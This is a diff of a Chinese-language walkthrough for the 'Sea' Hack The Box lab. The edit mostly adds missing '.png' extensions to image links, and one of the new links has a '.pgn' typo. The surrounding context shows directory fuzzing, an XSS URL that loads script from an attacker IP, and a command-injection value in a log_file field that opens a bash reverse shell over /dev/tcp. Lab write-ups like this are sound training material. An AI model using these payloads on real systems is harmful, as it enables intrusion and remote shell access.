@@ -5,7 +5,7 @@ $ nmap -sC -sV IP
 
 $ echo '10.129.23.18 sea.htb' | usdo tee -a /etc/hosts
 ```
-![傻呵呵的一天](images/091001)
+![傻呵呵的一天](images/091001.png)
 ### 模糊枚举1
 ```
 [★]$ ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -u "http://sea.htb/FUZZ" -c -v
@@ -143,12 +143,12 @@ http://sea.htb/index.php?page=LoginURL"></form><script+src="http://10.10.14.149:
 ----------------------------
 ```
 #### 复制它生成的URL填写到浏览器的Website,Submit
-![傻呵呵的一天](images/091002)
+![傻呵呵的一天](images/091002.png)
 #### 返回了200
-![傻呵呵的一天](images/091003)
+![傻呵呵的一天](images/091003.pgn)
 #### [★]$ nc -lvvp 4444它是没反应的
 ### 在浏览器按FN 12，打开控制台
-![傻呵呵的一天](images/091004)
+![傻呵呵的一天](images/091004.png)
 #### 尝试从完整 URL 中提取出“基础路径”或者“主机地址”，方便拼接其他路径
 #### 是按照exploit.py里面的命令进行测试的
 ##### split("/").slice(0,-1).join("/") 这一步，把最后一个 / 后面的部分去掉
@@ -257,7 +257,7 @@ amay@sea:~$
 #### burpsuite与浏览器之间的端口依旧是8080
 #### 点击Analyze
 ### 尝试注入一个新的命令使用；/tmp/test.txt
-![傻呵呵的一天](images/091005)
+![傻呵呵的一天](images/091005.png)
 #### 查看
 ```
 amay@sea:~$ ls -la /tmp/test.txt
@@ -277,7 +277,7 @@ log_file=%2Fvar%2Flog%2Fapache2%2F;bash+-c+'bash+-i+>%26+/dev/tcp/10.10.14.149/4
 [★]$ nc -lvnp 4445
 ```
 #### Send
-![傻呵呵的一天](images/091006)
+![傻呵呵的一天](images/091006.png)
 #### 笑死完全是拼手速，复制好cat /root/root.txt
 ```
 [★]$ nc -lvnp 4445
